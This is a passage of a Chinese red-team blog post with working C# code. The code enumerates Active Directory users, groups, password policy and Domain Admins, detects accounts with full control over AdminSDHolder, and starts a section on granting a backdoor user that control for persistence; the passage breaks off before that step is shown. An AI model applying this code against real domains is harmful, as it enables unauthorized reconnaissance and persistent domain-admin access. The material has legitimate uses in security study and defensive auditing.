&quot;hack&quot;;</span><br><span class="line">            string password = &quot;test123..&quot;;</span><br><span class="line">            DirectoryEntry coon = new DirectoryEntry(url, username, password);</span><br><span class="line">            DirectorySearcher search = new DirectorySearcher(coon);</span><br><span class="line">            search.Filter = &quot;(&amp;(objectClass=user)(objectCategory=person))&quot;;</span><br><span class="line">            foreach(SearchResult r in search.FindAll())</span><br><span class="line">            &#123;</span><br><span class="line">                string users = &quot;&quot;;</span><br><span class="line">                try</span><br><span class="line">                &#123;</span><br><span class="line">                    users = r.Properties[&quot;name&quot;][0].ToString();</span><br><span class="line">                    Console.WriteLine(users);</span><br><span class="line">                &#125;</span><br><span class="line">                catch</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(&quot;error&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>执行结果为：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/filess/img2@main/2021/10/01/1633088427362-701802a0-5d39-4a47-9ce7-183415230e75.png"></p>
+<h1 id="0x03-c-获取域内基本信息"><a href="#0x03-c-获取域内基本信息" class="headerlink" title="0x03 c#获取域内基本信息"></a>0x03 c#获取域内基本信息</h1><p>前面连接函数已经写好后面获取这些基本信息就很简单了。<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public static void GetAllUsers()</span><br><span class="line">&#123;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        Ldapcoon.LDAP_COON();</span><br><span class="line">        Ldapcoon.search.Filter = &quot;(&amp;(objectClass=user)(objectCategory=person))&quot;;</span><br><span class="line">        Font.InfoFonts();</span><br><span class="line">        Console.WriteLine(&quot;===========All Users===========&quot;);</span><br><span class="line">        Font.NormailFonts();</span><br><span class="line">        foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">        &#123;</span><br><span class="line">            string domain_users = &quot;&quot;;</span><br><span class="line">            domain_users = r.Properties[&quot;name&quot;][0].ToString();</span><br><span class="line">            Console.WriteLine(domain_users);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    catch</span><br><span class="line">    &#123;</span><br><span class="line">        Font.Warning();</span><br><span class="line">        Console.WriteLine(&quot;error!&quot;);</span><br><span class="line">        Font.NormailFonts();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+<p>首先通过Ldapcoon类的LDAP_COON()方法获取域内节点coon，和可以用来搜索的search。域内就会返回域内的DirectoryEntry和DirectorySearcher对象，域外就会返回域外的DirectoryEntry和DirectorySearcher对象。<br>​</p>
+<p>后面一些其他的就不再详讲<br>​</p>
+<p>查询域内组</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public static void GetAllGroups()</span><br><span class="line"> &#123;</span><br><span class="line">     try</span><br><span class="line">     &#123;</span><br><span class="line">         Ldapcoon.LDAP_COON();</span><br><span class="line">         Ldapcoon.search.Filter = &quot;(&amp;(objectCategory=group))&quot;;</span><br><span class="line">         Font.InfoFonts();</span><br><span class="line">         Console.WriteLine(&quot;===========All Groups===========&quot;);</span><br><span class="line">         Font.NormailFonts();</span><br><span class="line">         foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">         &#123;</span><br><span class="line">             string groups = &quot;&quot;;</span><br><span class="line">             string groupdescription = &quot;&quot;;</span><br><span class="line">             groups = r.Properties[&quot;cn&quot;][0].ToString();</span><br><span class="line">             Console.WriteLine(&quot;Group: &quot; + groups);</span><br><span class="line">             //groupdescription = r.Properties[&quot;description&quot;][0].ToString();</span><br><span class="line">             //Console.WriteLine(&quot;Description: &quot; + groupdescription + &quot;\r\n&quot;);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     catch</span><br><span class="line">     &#123;</span><br><span class="line">         Font.Warning();</span><br><span class="line">         Console.WriteLine(&quot;error!&quot;);</span><br><span class="line">         Font.NormailFonts();</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>域内密码策略：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">public static void GetPassPolicy()</span><br><span class="line">&#123;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        Ldapcoon.LDAP_COON();</span><br><span class="line">        Font.InfoFonts();</span><br><span class="line">        Console.WriteLine(&quot;===========Pass Policy===========&quot;);</span><br><span class="line">        Font.NormailFonts();</span><br><span class="line">        SearchResult r = Ldapcoon.search.FindOne();</span><br><span class="line">        long maxDays = 0;</span><br><span class="line">        long minDays = 0;</span><br><span class="line">        Int64 maxPwdAge = 0;</span><br><span class="line">        Int64 minPwdAge = 0;</span><br><span class="line">        string minPwdLength = &quot;&quot;;</span><br><span class="line">        string lockoutThreshold = &quot;&quot;;</span><br><span class="line">        Int64 lockoutDuration = 0;</span><br><span class="line">        long lockTime = 0;</span><br><span class="line"></span><br><span class="line">        maxPwdAge = (Int64)r.Properties[&quot;maxPwdAge&quot;][0];</span><br><span class="line">        maxDays = maxPwdAge / -864000000000;</span><br><span class="line"></span><br><span class="line">        minPwdAge = (Int64)r.Properties[&quot;minPwdAge&quot;][0];</span><br><span class="line">        minDays = minPwdAge / -864000000000;</span><br><span class="line"></span><br><span class="line">        minPwdLength = r.Properties[&quot;minPwdLength&quot;][0].ToString();</span><br><span class="line"></span><br><span class="line">        lockoutThreshold = r.Properties[&quot;lockoutThreshold&quot;][0].ToString();</span><br><span class="line"></span><br><span class="line">        lockoutDuration = (Int64)r.Properties[&quot;lockoutDuration&quot;][0];</span><br><span class="line">        lockTime = lockoutDuration / -864000000000;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Console.WriteLine(&quot;最小修改密码时间:&quot; + minDays);</span><br><span class="line">        Console.WriteLine(&quot;最大修改密码时间:&quot; + maxDays);</span><br><span class="line">        Console.WriteLine(&quot;最小密码长度:&quot; + minPwdLength);</span><br><span class="line">        Console.WriteLine(&quot;多少次锁定:&quot; + lockoutThreshold);</span><br><span class="line">        Console.WriteLine(&quot;锁定持续时间:&quot; + lockTime);</span><br><span class="line">    &#125;</span><br><span class="line">    catch</span><br><span class="line">    &#123;</span><br><span class="line">        Font.Warning();</span><br><span class="line">        Console.WriteLine(&quot;error!&quot;);</span><br><span class="line">        Font.NormailFonts();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>域管</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">public static void GetAllAdmins()</span><br><span class="line">&#123;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        Ldapcoon.LDAP_COON();</span><br><span class="line">        Ldapcoon.search.Filter = &quot;(&amp;(objectClass=group)(cn=Domain Admins))&quot;;</span><br><span class="line">        Font.InfoFonts();</span><br><span class="line">        Console.WriteLine(&quot;===========All Domain Admins===========&quot;);</span><br><span class="line">        Font.NormailFonts();</span><br><span class="line">        foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">        &#123;</span><br><span class="line">            int domain_users_count = 0;</span><br><span class="line">            string domain_users = &quot;&quot;;</span><br><span class="line">            int len = 0;</span><br><span class="line">            domain_users_count = r.Properties[&quot;member&quot;].Count;</span><br><span class="line">            while(len &lt; domain_users_count)</span><br><span class="line">            &#123;</span><br><span class="line">                domain_users = r.Properties[&quot;member&quot;][len].ToString();</span><br><span class="line">                len++;</span><br><span class="line">                if (domain_users.Contains(&quot;User&quot;))</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(domain_users);</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    catch</span><br><span class="line">    &#123;</span><br><span class="line">        Font.Warning();</span><br><span class="line">        Console.WriteLine(&quot;error!&quot;);</span><br><span class="line">        Font.NormailFonts();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">                                           </span><br></pre></td></tr></table></figure>
+
+<p>这里查询域管，我是这样进行处理的，我们先通过ldapsearch来查看返回结果<br>​</p>
+<p><img src="https://cdn.jsdelivr.net/gh/filess/img5@main/2021/10/01/1633088452249-ac636722-4320-4a0d-bef1-3ea3d85ab70d.png"></p>
+<p>然后我获取member的数量然后看里面是否包含user来输出。</p>
+<h2 id><a href="#" class="headerlink" title></a></h2><h1 id="0x04-AdminSDHolder检测与后门用户添加"><a href="#0x04-AdminSDHolder检测与后门用户添加" class="headerlink" title="0x04 AdminSDHolder检测与后门用户添加"></a>0x04 AdminSDHolder检测与后门用户添加</h1><h2 id="4-1-检测"><a href="#4-1-检测" class="headerlink" title="4.1 检测"></a>4.1 检测</h2><p>AdminSDHolder是对CN=AdminSDHolder,CN=System,DC=redteam,DC=local这个cn拥有完全控制权限的用户，我们前面说到<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public DirectorySearcher (System.DirectoryServices.DirectoryEntry searchRoot);</span><br></pre></td></tr></table></figure>
+
+<p>这里的searchroot就是查询的根地址我们就需要绑定到CN=AdminSDHolder,CN=System,DC=redteam,DC=local这里来也就是说url为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LDAP://192.168.11.16/CN=AdminSDHolder,CN=System,DC=redteam,DC=local</span><br><span class="line">或者为</span><br><span class="line">LDAP://redteam/CN=AdminSDHolder,CN=System,DC=redteam,DC=local</span><br></pre></td></tr></table></figure>
+
+<p>每个域的名字都不一样所以我们要来获取对象的DC=redteam,DC=local和redteam这个值。<br>​</p>
+<p>这里我们来创建一个public_value类也就是公共值类。<br>​</p>
+<p>我们通过adexplorer来可以看到distinguishedName的值就为我们需要的。<br>​</p>
+<p><img src="https://cdn.jsdelivr.net/gh/filess/img14@main/2021/10/01/1633088468976-fab86b78-5cf2-4087-a996-0bd9db2b4f4b.png"></p>
+<p>我们可以看到objectClass为domainDNS.<br>​</p>
+<p><img src="https://cdn.jsdelivr.net/gh/filess/img15@main/2021/10/01/1633088478583-804062c4-3827-4e72-b253-dae9bd7d5044.png"></p>
+<p>所以我们的filter为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(objectClass=domainDNS))</span><br></pre></td></tr></table></figure>
+
+<p>这里先用ldapsearch来进行查询<br>​</p>
+<p><img src="https://cdn.jsdelivr.net/gh/filess/img17@main/2021/10/01/1633088490189-cd528aeb-2f9d-48e4-b0c0-80e9c84d720e.png"></p>
+<p>所以我们可以写一个方法来获取了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//获取DC=redteam,DC=local这个值</span><br><span class="line">public static String GetdistinguishedName()</span><br><span class="line">&#123;</span><br><span class="line">    string Domain_DNS_Name = &quot;&quot;;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        Ldapcoon.LDAP_COON();</span><br><span class="line">        Ldapcoon.search.Filter = &quot;(&amp;(objectClass=domainDNS))&quot;;</span><br><span class="line">        foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">        &#123;</span><br><span class="line">            string domainDNS_Name = &quot;&quot;;</span><br><span class="line">            domainDNS_Name = r.Properties[&quot;distinguishedName&quot;][0].ToString();</span><br><span class="line">            Domain_DNS_Name = domainDNS_Name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    catch</span><br><span class="line">    &#123;</span><br><span class="line">        Font.Warning();</span><br><span class="line">        Console.WriteLine(&quot;error!&quot;);</span><br><span class="line">        Font.NormailFonts();</span><br><span class="line">    &#125;</span><br><span class="line">    return Domain_DNS_Name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>同理</p>
+<p><img src="https://cdn.jsdelivr.net/gh/filess/img19@main/2021/10/01/1633088501243-7be00078-8a63-4da1-8d33-c31640484d97.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">//获取readteam这个值</span><br><span class="line">public static String Get_Dns_First_Name()</span><br><span class="line">&#123;</span><br><span class="line">    string Dns_First_Name = &quot;&quot;;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        Ldapcoon.LDAP_COON();</span><br><span class="line">        Ldapcoon.search.Filter = &quot;(&amp;(objectClass=domainDNS))&quot;;</span><br><span class="line">        foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">        &#123;</span><br><span class="line">            string domainDC_Name = &quot;&quot;;</span><br><span class="line">            domainDC_Name = r.Properties[&quot;dc&quot;][0].ToString();</span><br><span class="line">            Dns_First_Name = domainDC_Name;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    catch</span><br><span class="line">    &#123;</span><br><span class="line">        Font.Warning();</span><br><span class="line">        Console.WriteLine(&quot;error!&quot;);</span><br><span class="line">        Font.NormailFonts();</span><br><span class="line">    &#125;</span><br><span class="line">    return Dns_First_Name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>那么现在就可以绑定adminsdholder路径了<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">//首先获取DC=redteam,DC=local这个值</span><br><span class="line">         string distinguishedName = &quot;&quot;;</span><br><span class="line">         distinguishedName = public_value.GetdistinguishedName();</span><br><span class="line">         //然后获取readteam这个值</span><br><span class="line">         string dc = &quot;&quot;;</span><br><span class="line">         dc = public_value.Get_Dns_First_Name();</span><br><span class="line">         if (dc != &quot;&quot; &amp;&amp; distinguishedName != &quot;&quot;)</span><br><span class="line">         &#123;</span><br><span class="line">             //进行拼接如果在域内可以直接拼接为以下</span><br><span class="line">             //LDAP://redteam/CN=AdminSDHolder,CN=System,DC=redteam,DC=local</span><br><span class="line"></span><br><span class="line">             bool flag = public_value.isindomain();</span><br><span class="line">             string AdminSDHolder_path = &quot;&quot;;</span><br><span class="line">             if (flag)</span><br><span class="line">             &#123;</span><br><span class="line">                 AdminSDHolder_path = &quot;LDAP://&quot; + dc + &quot;/CN=AdminSDHolder,CN=System,&quot; + distinguishedName;</span><br><span class="line">             &#125;</span><br><span class="line">             else</span><br><span class="line">             &#123;</span><br><span class="line">                 AdminSDHolder_path = &quot;LDAP://&quot; + GetArgsValue.domain + &quot;/CN=AdminSDHolder,CN=System,&quot; + distinguishedName;</span><br><span class="line">             &#125;</span><br><span class="line">             Ldapcoon.coon.Path = AdminSDHolder_path;</span><br></pre></td></tr></table></figure>
+
+<p>这里为了方便我写了个isindomain放来来判断是否在域内还是在域外<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//判断域内还是域外</span><br><span class="line">public static bool isindomain()</span><br><span class="line">&#123;</span><br><span class="line">    if (GetArgsValue.user != &quot;&quot; &amp;&amp; GetArgsValue.pass != &quot;&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>我们需求很简单就是要获取哪些用户对adminsdholder这个cn拥有完全控制权限。<br>​</p>
+<p>DirectoryEntry类有个属性叫做ObjectSecurity作用是获取或设置此项的安全说明符。这个详细请自行查看msdn。<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ActiveDirectorySecurity sec = Ldapcoon.coon.ObjectSecurity;</span><br><span class="line">           AuthorizationRuleCollection rules = null;</span><br><span class="line">           rules = sec.GetAccessRules(true, true, typeof(NTAccount));</span><br><span class="line">           foreach (ActiveDirectoryAccessRule rule in rules)</span><br><span class="line">           &#123;</span><br><span class="line">               if (rule.ActiveDirectoryRights.ToString().Equals(&quot;GenericAll&quot;))</span><br><span class="line">               &#123;</span><br><span class="line">                   string acl = rule.IdentityReference.Value;</span><br><span class="line">                   if (acl.Contains(&quot;-&quot;))</span><br><span class="line">                   &#123;</span><br><span class="line">                       //域外查询可能会出现用户名为sid的情况。所以需要转换</span><br><span class="line">                       //Console.WriteLine(acl);</span><br><span class="line">                       string user_name = public_value.SidToUserName(acl);</span><br><span class="line">                       if(user_name != &quot;error&quot;)</span><br><span class="line">                       &#123;</span><br><span class="line">                           Console.WriteLine(user_name);</span><br><span class="line">                       &#125;  </span><br><span class="line">                   &#125;</span><br><span class="line">                   else</span><br><span class="line">                   &#123;</span><br><span class="line">                       Console.WriteLine(acl);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure>
+
+<p>获取到coon的安全说明符后调用GetAccessRules方法获取与指定的安全性标识符关联的访问规则的集合。也就是说获取我们这个节点的规则集合，然后用foreach来循环判断。当用户的ActiveDirectoryRights也就是权限为GenericAll我们就输出出来他的名字，也就是对adminsdholder这个拥有完全控制权限的用户。当我们在域外的时候我们获取到的用户可能是sid，所以我们还需要让sid转换为域内用户名字。当然这个用户可能是一个user，group或者一个computer<br>​</p>
+<p>这里调用了public_value的SidToUserName方法。<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">//sid to username</span><br><span class="line">public static string SidToUserName(string sid)</span><br><span class="line">&#123;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        Ldapcoon.LDAP_COON();</span><br><span class="line">        string url = &quot;LDAP://&quot; + GetArgsValue.domain + &quot;/&lt;SID=&quot; + sid + &quot;&gt;&quot;;</span><br><span class="line">        Ldapcoon.coon.Path = url;</span><br><span class="line">        Ldapcoon.search.Filter = &quot;(&amp;(objectClass=user)(objectCategory=person))&quot;;</span><br><span class="line">        foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">        &#123;</span><br><span class="line">            string users = &quot;&quot;;</span><br><span class="line">            users = r.Properties[&quot;name&quot;][0].ToString();</span><br><span class="line">            if (users != &quot;&quot;)</span><br><span class="line">            &#123;</span><br><span class="line">                return users;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Ldapcoon.search.Filter = &quot;(&amp;(objectClass=group))&quot;;</span><br><span class="line">        foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">        &#123;</span><br><span class="line">            string groups = &quot;&quot;;</span><br><span class="line">            groups = r.Properties[&quot;name&quot;][0].ToString();</span><br><span class="line">            if (groups != &quot;&quot;)</span><br><span class="line">            &#123;</span><br><span class="line">                return groups;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Ldapcoon.search.Filter = &quot;(&amp;(objectClass=computer))&quot;;</span><br><span class="line">        foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">        &#123;</span><br><span class="line">            string computers = &quot;&quot;;</span><br><span class="line">            computers = r.Properties[&quot;name&quot;][0].ToString();</span><br><span class="line">            if (computers != &quot;&quot;)</span><br><span class="line">            &#123;</span><br><span class="line">                return computers;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    catch</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    return &quot;error&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在ldap用支持以下语法这种形式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LDAP://192.168.11.16/&lt;SID=xxxxxxxxxx&gt;</span><br></pre></td></tr></table></figure>
+
+<p>于是我们把sid带入，设置coon.path为该用户再通过(&amp;(objectClass=user)(objectCategory=person))过滤条件搜索出来，比如<br>​</p>
+<p><img src="https://cdn.jsdelivr.net/gh/filess/img19@main/2021/10/01/1633088516986-4eaffbea-f3dc-48c2-b0bd-21a003d74749.png"></p>
+<p>我们绑定了hack用户为rootpath，那么通过过滤条件搜索出来的也是它自己，因为它没有子节点了。然后获取他的name值，当获取到的不为空就返回，否则就返回error，然后在adminsdholder检测代码这边我们写道<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">string acl = rule.IdentityReference.Value;</span><br><span class="line">if (acl.Contains(&quot;-&quot;))</span><br><span class="line">&#123;</span><br><span class="line">    //域外查询可能会出现用户名为sid的情况。所以需要转换</span><br><span class="line">    //Console.WriteLine(acl);</span><br><span class="line">    string user_name = public_value.SidToUserName(acl);</span><br><span class="line">    if(user_name != &quot;error&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(user_name);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
+
+<p>当user_name不为error的时候就会输出，那么什么时候会输出error呢？假如我们以前有一个用户为qqq，然后他对adminsdholder这个组拥有完全控制权限，但是我们后来把这个用户删除了，他就会到一个CN=Deleted Objects里面他的sid就为url就为下面这个然后我们的LDAP://redteam/&lt;SID=xxx&gt;就会失败。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CN=qqqDEL:67e38247-2727-4c5a-8704-c9f33ad747da,CN=Deleted Objects,DC=redteam,DC=local</span><br></pre></td></tr></table></figure>
+
+<p>我们在匹配谁对adminsdholder拥有完全控制权限的时候还是会检测到。就搜索失败返回error，这里我们获取到error的直接continue。<br>​</p>
+<h2 id="4-2-添加"><a href="#4-2-添加" class="headerlink" title="4.2 添加"></a>4.2 添加</h2><p>前面同理我们需要设置rootpath</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Ldapcoon.LDAP_COON();</span><br><span class="line">//获取DC=redteam,DC=local</span><br><span class="line">string distinguishedName = &quot;&quot;;</span><br><span class="line">string domainname = &quot;&quot;;</span><br><span class="line">domainname = public_value.Get_Dns_First_Name();</span><br><span class="line">distinguishedName = public_value.GetdistinguishedName();</span><br><span class="line"></span><br><span class="line">//string AdminSDHolder_Path = &quot;LDAP://192.168.11.16/CN=System,DC=redteam,DC=local&quot;;</span><br><span class="line">string AdminSDHolder_Path = &quot;LDAP://&quot; + domainname + &quot;/&quot; + &quot;CN=System,&quot; + distinguishedName;</span><br><span class="line">//Console.WriteLine(AdminSDHolder_Path);</span><br><span class="line">Ldapcoon.coon.Path = AdminSDHolder_Path;</span><br></pre></td></tr></table></figure>
+
+<p>赋予用户对adminsdholder完全控制权限</p>
